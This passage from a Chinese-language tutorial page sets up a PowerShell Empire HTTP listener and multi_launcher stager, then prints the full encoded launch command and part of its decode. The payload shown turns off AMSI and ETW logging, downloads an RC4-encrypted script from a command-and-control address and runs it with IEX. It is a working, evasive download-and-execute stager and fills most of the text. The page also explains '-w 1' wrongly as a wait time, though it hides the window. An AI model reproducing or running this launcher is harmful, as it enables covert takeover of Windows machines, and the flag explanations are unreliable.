vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">uselistener</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282249539.png" alt="image-20230528224951466"></p></blockquote><p>这里可以看到, 默认情况下 Host 和 BindIP 都绑定的本地, 这里保持该默认配置, 然后设置下 Port</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Set Port</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Port</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 9090</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282304647.png" alt="image-20230528230437563"></p></blockquote><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># execute 以使用此 listener</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">execute</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282305293.png" alt="image-20230528230556271"></p></blockquote><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># stager</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">usestager</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> multi_launcher</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282306410.png" alt="image-20230528230627366"></p></blockquote><p>可以看到 Language 默认为 powershell, 这里再设置一下 listener 为刚才创建的 http listener 然后执行</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> listener</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">execute</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282307913.png" alt="image-20230528230738873"></p><blockquote><p>PS: [+] New agent xxx checked in 那里是后面主机上线的提示, 刚执行完 execute 是不会出现的</p></blockquote></blockquote><p>上线命令如下:</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">powershell </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">noP </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">sta </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">w </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABBAEEATQBBAEEAdQBBAEQARQBBAEwAZwBBAHgAQQBDADQAQQBNAFEAQQB6AEEARABZAEEATwBnAEEANQBBAEQAQQBBAE8AUQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAEgAdQB2ACwAMwBnAHQAcwBjAH0AIwBfAEUAOgBmAEYAWAB3AG4AMgBiAFUAUABWAHwAaQBNAGUAMAArADUAUgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAYwBIAEcAQQBmAGQATABaAEQAQwBFAHQATABNAEsAPQBsAEwAcQA4AFUAdwBpAEUAdQB6AHYASQBRAEQANABqADcAcAA2AEkASgBzAGgAaQBpADEARQA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><ul><li><code>powershell</code>：表示调用 PowerShell 程序。</li><li><code>-noP</code>：表示不加载配置文件。包括启动时加载的个人配置文件(Profile) 和系统级别的配置文件。使用此参数可以在启动 PowerShell 时跳过配置文件的加载，加快启动速度。</li><li><code>-sta</code>：<code>Single Threaded Apartment</code>表示使用单线程的会话模式。</li><li><code>-w 1</code>：等待指定的时间(以秒为单位) 后自动退出 PowerShell。在这里，<code>-w 1</code> 表示等待 1 秒后自动退出 PowerShell。</li><li><code>-enc</code>：表示后面跟着的是一个 Base64 编码的字符串，需要解码后执行。</li></ul><blockquote><div class="language-base64 line-numbers-mode" data-highlighter="shiki" data-ext="base64" data-title="base64" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABBAEEATQBBAEEAdQBBAEQARQBBAEwAZwBBAHgAQQBDADQAQQBNAFEAQQB6AEEARABZAEEATwBnAEEANQBBAEQAQQBBAE8AUQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAEgAdQB2ACwAMwBnAHQAcwBjAH0AIwBfAEUAOgBmAEYAWAB3AG4AMgBiAFUAUABWAHwAaQBNAGUAMAArADUAUgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAYwBIAEcAQQBmAGQATABaAEQAQwBFAHQATABNAEsAPQBsAEwAcQA4AFUAdwBpAEUAdQB6AHYASQBRAEQANABqADcAcAA2AEkASgBzAGgAaQBpADEARQA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>上述 base64 解码后得到:</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&quot;I\u0000f\u0000(\u0000$\u0000P\u0000S\u0000V\u0000e\u0000r\u0000s\u0000i\u0000o\u0000n\u0000T\u0000a\u0000b\u0000l\u0000e\u0000.\u0000P\u0000S\u0000V\u0000e\u0000r\u0000s\u0000i\u0000o\u0000n\u0000.\u0000M\u0000a\u0000j\u0000o\u0000r\u0000 \u0000-\u0000g\u0000e\u0000 \u00003\u0000)\u0000{\u0000$\u0000R\u0000e\u0000f\u0000=\u0000[\u0000R\u0000e\u0000f\u0000]\u0000.\u0000A\u0000s\u0000s\u0000e\u0000m\u0000b\u0000l\u0000y\u0000.\u0000G\u0000e\u0000t\u0000T\u0000y\u0000p\u0000e\u0000(\u0000&#39;\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000M\u0000a\u0000n\u0000a\u0000g\u0000e\u0000m\u0000e\u0000n\u0000t\u0000.\u0000A\u0000u\u0000t\u0000o\u0000m\u0000a\u0000t\u0000i\u0000o\u0000n\u0000.\u0000A\u0000m\u0000s\u0000i\u0000U\u0000t\u0000i\u0000l\u0000s\u0000&#39;\u0000)\u0000;\u0000$\u0000R\u0000e\u0000f\u0000.\u0000G\u0000e\u0000t\u0000F\u0000i\u0000e\u0000l\u0000d\u0000(\u0000&#39;\u0000a\u0000m\u0000s\u0000i\u0000I\u0000n\u0000i\u0000t\u0000F\u0000a\u0000i\u0000l\u0000e\u0000d\u0000&#39;\u0000,\u0000&#39;\u0000N\u0000o\u0000n\u0000P\u0000u\u0000b\u0000l\u0000i\u0000c\u0000,\u0000S\u0000t\u0000a\u0000t\u0000i\u0000c\u0000&#39;\u0000)\u0000.\u0000S\u0000e\u0000t\u0000v\u0000a\u0000l\u0000u\u0000e\u0000(\u0000$\u0000N\u0000u\u0000l\u0000l\u0000,\u0000$\u0000t\u0000r\u0000u\u0000e\u0000)\u0000;\u0000[\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000D\u0000i\u0000a\u0000g\u0000n\u0000o\u0000s\u0000t\u0000i\u0000c\u0000s\u0000.\u0000E\u0000v\u0000e\u0000n\u0000t\u0000i\u0000n\u0000g\u0000.\u0000E\u0000v\u0000e\u0000n\u0000t\u0000P\u0000r\u0000o\u0000v\u0000i\u0000d\u0000e\u0000r\u0000]\u0000.\u0000G\u0000e\u0000t\u0000F\u0000i\u0000e\u0000l\u0000d\u0000(\u0000&#39;\u0000m\u0000_\u0000e\u0000n\u0000a\u0000b\u0000l\u0000e\u0000d\u0000&#39;\u0000,\u0000&#39;\u0000N\u0000o\u0000n\u0000P\u0000u\u0000b\u0000l\u0000i\u0000c\u0000,\u0000I\u0000n\u0000s\u0000t\u0000a\u0000n\u0000c\u0000e\u0000&#39;\u0000)\u0000.\u0000S\u0000e\u0000t\u0000V\u0000a\u0000l\u0000u\u0000e\u0000(\u0000[\u0000R\u0000e\u0000f\u0000]\u0000.\u0000A\u0000s\u0000s\u0000e\u0000m\u0000b\u0000l\u0000y\u0000.\u0000G\u0000e\u0000t\u0000T\u0000y\u0000p\u0000e\u0000(\u0000&#39;\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000M\u0000a\u0000n\u0000a\u0000g\u0000e\u0000m\u0000e\u0000n\u0000t\u0000.\u0000A\u0000u\u0000t\u0000o\u0000m\u0000a\u0000t\u0000i\u0000o\u0000n\u0000.\u0000T\u0000r\u0000a\u0000c\u0000i\u0000n\u0000g\u0000.\u0000P\u0000S\u0000E\u0000t\u0000w\u0000L\u0000o\u0000g\u0000P\u0000r\u0000o\u0000v\u0000i\u0000d\u0000e\u0000r\u0000&#39;\u0000)\u0000.\u0000G\u0000e\u0000t\u0000F\u0000i\u0000e\u0000l\u0000d\u0000(\u0000&#39;\u0000e\u0000t\u0000w\u0000P\u0000r\u0000o\u0000v\u0000i\u0000d\u0000e\u0000r\u0000&#39;\u0000,\u0000&#39;\u0000N\u0000o\u0000n\u0000P\u0000u\u0000b\u0000l\u0000i\u0000c\u0000,\u0000S\u0000t\u0000a\u0000t\u0000i\u0000c\u0000&#39;\u0000)\u0000.\u0000G\u0000e\u0000t\u0000V\u0000a\u0000l\u0000u\u0000e\u0000(\u0000$\u0000n\u0000u\u0000l\u0000l\u0000)\u0000,\u00000\u0000)\u0000;\u0000}\u0000;\u0000[\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000N\u0000e\u0000t\u0000.\u0000S\u0000e\u0000r\u0000v\u0000i\u0000c\u0000e\u0000P\u0000o\u0000i\u0000n\u0000t\u0000M\u0000a\u0000n\u0000a\u0000g\u0000e\u0000r\u0000]\u0000:\u0000:\u0000E\u0000x\u0000p\u0000e\u0000c\u0000t\u00001\u00000\u00000\u0000C\u0000o\u0000n\u0000t\u0000i\u0000n\u0000u\u0000e\u0000=\u00000\u0000;\u0000$\u0000w\u0000c\u0000=\u0000N\u0000e\u0000w\u0000-\u0000O\u0000b\u0000j\u0000e\u0000c\u0000t\u0000 \u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000N\u0000e\u0000t\u0000.\u0000W\u0000e\u0000b\u0000C\u0000l\u0000i\u0000e\u0000n\u0000t\u0000;\u0000$\u0000u\u0000=\u0000&#39;\u0000M\u0000o\u0000z\u0000i\u0000l\u0000l\u0000a\u0000/\u00005\u0000.\u00000\u0000 \u0000(\u0000W\u0000i\u0000n\u0000d\u0000o\u0000w\u0000s\u0000 \u0000N\u0000T\u0000 \u00006\u0000.\u00001\u0000;\u0000 \u0000W\u0000O\u0000W\u00006\u00004\u0000;\u0000 \u0000T\u0000r\u0000i\u0000d\u0000e\u0000n\u0000t\u0000/\u00007\u0000.\u00000\u0000;\u0000 \u0000r\u0000v\u0000:\u00001\u00001\u0000.\u00000\u0000)\u0000 \u0000l\u0000i\u0000k\u0000e\u0000 \u0000G\u0000e\u0000c\u0000k\u0000o\u0000&#39;\u0000;\u0000$\u0000s\u0000e\u0000r\u0000=\u0000$\u0000(\u0000[\u0000T\u0000e\u0000x\u0000t\u0000.\u0000E\u0000n\u0000c\u0000o\u0000d\u0000i\u0000n\u0000g\u0000]\u0000:\u0000:\u0000U\u0000n\u0000i\u0000c\u0000o\u0000d\u0000e\u0000.\u0000G\u0000e\u0000t\u0000S\u0000t\u0000r\u0000i\u0000n\u0000g\u0000(\u0000[\u0000C\u0000o\u0000n\u0000v\u0000e\u0000r\u0000t\u0000]\u0000:\u0000:\u0000F\u0000r\u0000o\u0000m\u0000B\u0000a\u0000s\u0000e\u00006\u00004\u0000S\u0000t\u0000r\u0000i\u0000n\u0000g\u0000(\u0000&#39;\u0000a\u0000A\u0000B\u00000\u0000A\u0000H\u0000Q\u0000A\u0000c\u0000A\u0000A\u00006\u0000A\u0000C\u00008\u0000A\u0000L\u0000w\u0000A\u0000x\u0000A\u0000D\u0000A\u0000A\u0000M\u0000A\u0000A\u0000u\u0000A\u0000D\u0000E\u0000A\u0000L\u0000g\u0000A\u0000x\u0000A\u0000C\u00004\u0000A\u0000M\u0000Q\u0000A\u0000z\u0000A\u0000D\u0000Y\u0000A\u0000O\u0000g\u0000A\u00005\u0000A\u0000D\u0000A\u0000A\u0000O\u0000Q\u0000A\u0000w\u0000A\u0000A\u0000=\u0000=\u0000&#39;\u0000)\u0000)\u0000)\u0000;\u0000$\u0000t\u0000=\u0000&#39;\u0000/\u0000l\u0000o\u0000g\u0000i\u0000n\u0000/\u0000p\u0000r\u0000o\u0000c\u0000e\u0000s\u0000s\u0000.\u0000p\u0000h\u0000p\u0000&#39;\u0000;\u0000$\u0000w\u0000c\u0000.\u0000H\u0000e\u0000a\u0000d\u0000e\u0000r\u0000s\u0000.\u0000A\u0000d\u0000d\u0000(\u0000&#39;\u0000U\u0000s\u0000e\u0000r\u0000-\u0000A\u0000g\u0000e\u0000n\u0000t\u0000&#39;\u0000,\u0000$\u0000u\u0000)\u0000;\u0000$\u0000w\u0000c\u0000.\u0000P\u0000r\u0000o\u0000x\u0000y\u0000=\u0000[\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000N\u0000e\u0000t\u0000.\u0000W\u0000e\u0000b\u0000R\u0000e\u0000q\u0000u\u0000e\u0000s\u0000t\u0000]\u0000:\u0000:\u0000D\u0000e\u0000f\u0000a\u0000u\u0000l\u0000t\u0000W\u0000e\u0000b\u0000P\u0000r\u0000o\u0000x\u0000y\u0000;\u0000$\u0000w\u0000c\u0000.\u0000P\u0000r\u0000o\u0000x\u0000y\u0000.\u0000C\u0000r\u0000e\u0000d\u0000e\u0000n\u0000t\u0000i\u0000a\u0000l\u0000s\u0000 \u0000=\u0000 